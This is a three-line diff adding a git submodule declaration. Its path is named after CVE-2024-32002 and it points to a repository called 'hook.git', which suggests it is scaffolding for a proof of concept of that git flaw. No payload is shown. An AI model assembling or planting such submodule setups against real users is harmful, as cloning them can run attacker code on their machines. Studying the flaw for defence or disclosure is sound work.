@@ -1,0 +1,3 @@
+[submodule "x/y"]
+	path = git/CVE-2024-32002/A/modules/x
+	url = git@github.com:Roronoawjd/hook.git
